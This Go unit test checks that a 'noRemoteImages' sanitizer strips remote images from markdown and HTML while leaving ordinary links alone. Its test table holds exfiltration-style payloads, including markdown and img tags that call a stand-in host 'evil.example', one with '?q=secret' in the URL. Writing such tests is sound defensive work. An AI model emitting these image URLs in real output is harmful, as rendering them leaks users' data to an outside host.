package compose

import (
	"strings"
	"testing"
)

func TestNoRemoteImages(t *testing.T) {
	for _, c := range []struct{ in, want string }{
		{"hello", "hello"},
		{"", ""},
		{"a ![x](https://evil.example/p.png?q=secret) b", "a [image removed] b"},
		{"![](http://evil.example/a.gif)", "[image removed]"},
		{"![x][r]\n\n[r]: https://evil.example/p.png", "[image removed]\n\n[r]: https://evil.example/p.png"},
		{`<img src="https://evil.example/p.png">`, "[image removed]"},
		{`<IMG SRC=https://evil.example/p.png onerror=x>`, "[image removed]"},
		{"<img\nsrc='https://evil.example/p.png'", "[image removed]"},
		{`<iframe src="https://evil.example"></iframe>`, "[image removed]</iframe>"},
		{"see [the docs](https://docs.example/x)", "see [the docs](https://docs.example/x)"},
	} {
		if got := noRemoteImages(c.in); got != c.want {
			t.Errorf("%q: got %q, want %q", c.in, got, c.want)
		}
	}
	// No image survives in any mix.
	mixed := "x ![a](http://h/1.png) <img src=http://h/2.png> ![b][z] y"
	if got := noRemoteImages(mixed); strings.Contains(got, "http://h/") || strings.Contains(got, "![") || strings.Contains(strings.ToLower(got), "<img") {
		t.Errorf("an image is left: %q", got)
	}
}
